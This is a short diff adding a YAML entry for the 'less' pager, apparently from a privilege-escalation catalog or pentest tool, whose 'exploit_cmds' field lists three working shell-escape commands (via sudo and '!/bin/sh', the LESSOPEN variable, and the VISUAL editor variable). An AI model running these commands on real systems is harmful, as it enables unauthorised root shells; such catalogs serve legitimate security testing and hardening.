@@ -1,0 +1,6 @@
+name: less
+binary_path: /usr/bin/less
+exploit_cmds:
+- sudo /usr/bin/less /etc/hosts && !/bin/sh
+- 'LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" /usr/bin/less /etc/hosts && reset'
+- VISUAL='/bin/sh -s --' /usr/bin/less /etc/hosts && v
